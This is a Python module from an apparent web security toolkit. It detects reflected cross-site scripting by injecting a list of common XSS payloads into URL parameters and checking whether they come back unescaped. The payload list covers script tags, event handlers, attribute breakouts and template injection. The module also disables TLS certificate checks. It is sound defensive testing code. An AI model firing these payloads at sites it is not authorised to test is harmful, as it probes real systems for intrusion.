# =============================================================================
# CyberToolkit Pro — XSS Pattern Tester
# =============================================================================
# Tests for reflected XSS vulnerabilities by injecting common XSS payloads
# into URL parameters and checking if they appear unescaped in the response.
# Detection mode only — no exploitation.
# =============================================================================

import urllib.request
import urllib.error
import urllib.parse
import ssl
import time
import html
from core.models import ToolResult, Finding, Severity

TOOL_INFO = {
    "name": "xss_tester",
    "category": "web",
    "description": "Reflected XSS vulnerability detection tester",
    "author": "CyberToolkit Pro",
    "version": "1.0.0",
    "args": [
        {"name": "target", "required": True, "description": "Target URL with parameter (e.g. http://example.com/search?q=test)"},
        {"name": "param", "required": False, "default": "", "description": "Parameter to test (auto-detected if empty)"},
        {"name": "rate_limit", "required": False, "default": "200", "description": "Delay between requests in ms"},
    ],
    "tags": ["web", "xss", "cross-site-scripting", "vulnerability"],
}

# XSS test payloads with unique markers for reflection detection
XSS_PAYLOADS = [
    # Basic script injection
    ("<script>alert('XSS')</script>", "Basic script tag"),
    ("<ScRiPt>alert('XSS')</ScRiPt>", "Mixed case bypass"),
    # Event handlers
    ("<img src=x onerror=alert(1)>", "IMG onerror handler"),
    ("<svg onload=alert(1)>", "SVG onload handler"),
    ("<body onload=alert(1)>", "BODY onload handler"),
    ("<input onfocus=alert(1) autofocus>", "INPUT autofocus"),
    ("<details open ontoggle=alert(1)>", "DETAILS ontoggle"),
    # Attribute injection
    ("\" onmouseover=\"alert(1)\" x=\"", "Attribute breakout (double quote)"),
    ("' onmouseover='alert(1)' x='", "Attribute breakout (single quote)"),
    # JavaScript URI
    ("javascript:alert(1)", "JavaScript URI"),
    ("data:text/html,<script>alert(1)</script>", "Data URI"),
    # Encoding bypasses
    ("<script>alert(String.fromCharCode(88,83,83))</script>", "CharCode bypass"),
    # Template injection
    ("{{constructor.constructor('alert(1)')()}}", "Angular template injection"),
    ("${alert(1)}", "Template literal injection"),
]


def _make_request(url, timeout=10):
    """Make HTTP request and return response body + status."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(url)
        req.add_header("User-Agent", "CyberToolkitPro/2.0 SecurityScanner")

        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="replace")
        headers = dict(resp.headers)
        return resp.status, body, headers
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        headers = dict(e.headers) if e.headers else {}
        return e.code, body, headers
    except Exception as e:
        return 0, "", {}


def _check_reflection(body, payload):
    """Check if the payload is reflected unescaped in the response body."""
    # Direct reflection (unescaped)
    if payload in body:
        return "unescaped"
    # HTML-encoded reflection (safer but worth noting)
    escaped = html.escape(payload)
    if escaped in body:
        return "html_escaped"
    # Partial reflection (key dangerous parts)
    dangerous_parts = ["<script>", "onerror=", "onload=", "javascript:", "onfocus="]
    for part in dangerous_parts:
        if part in payload and part in body:
            return "partial_unescaped"
    return None


def run(args):
    target = args.get("target", "")
    if not target:
        return ToolResult(tool_name="xss_tester", status="error", error="No target specified")

    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"

    rate_limit = int(args.get("rate_limit", 200)) / 1000.0
    param_to_test = args.get("param", "")

    # Parse URL parameters
    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    params = {k: v[0] for k, v in params.items()}

    if not params:
        return ToolResult(
            tool_name="xss_tester", target=target, status="error",
            error="No query parameters found. Provide URL like: http://example.com/search?q=test",
        )

    test_params = [param_to_test] if param_to_test and param_to_test in params else list(params.keys())

    vulnerabilities = []
    findings = []
    test_count = 0

    for param in test_params:
        for payload, description in XSS_PAYLOADS:
            test_params_dict = params.copy()
            test_params_dict[param] = payload
            query_string = urllib.parse.urlencode(test_params_dict, quote_via=urllib.parse.quote)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

            status, body, headers = _make_request(test_url)
            test_count += 1

            reflection = _check_reflection(body, payload)

            # Check for CSP header (mitigating factor)
            has_csp = "content-security-policy" in {k.lower() for k in headers.keys()}

            if reflection == "unescaped":
                severity = Severity.HIGH if not has_csp else Severity.MEDIUM
                vuln = {
                    "param": param,
                    "payload": payload,
                    "type": description,
                    "reflection": reflection,
                    "csp_present": has_csp,
                }
                vulnerabilities.append(vuln)
                findings.append(Finding(
                    title=f"Reflected XSS in parameter '{param}'",
                    severity=severity,
                    description=f"Payload '{payload[:50]}' ({description}) reflected unescaped in response"
                                + (" (CSP present — may mitigate)" if has_csp else ""),
                    evidence=f"Payload: {payload}\nReflection type: {reflection}",
                    remediation="Encode all user input before rendering. Implement Content-Security-Policy header.",
                ))
            elif reflection == "partial_unescaped":
                vuln = {
                    "param": param,
                    "payload": payload,
                    "type": description,
                    "reflection": reflection,
                }
                vulnerabilities.append(vuln)
                findings.append(Finding(
                    title=f"Partial XSS reflection in parameter '{param}'",
                    severity=Severity.MEDIUM,
                    description=f"Dangerous parts of payload '{description}' reflected without full encoding",
                    remediation="Review output encoding for this parameter",
                ))

            if rate_limit > 0:
                time.sleep(rate_limit)

    return ToolResult(
        tool_name="xss_tester",
        target=target,
        status="success",
        data={
            "parameters_tested": test_params,
            "total_tests": test_count,
            "vulnerabilities": vulnerabilities,
            "vulnerability_count": len(vulnerabilities),
        },
        findings=findings,
    )
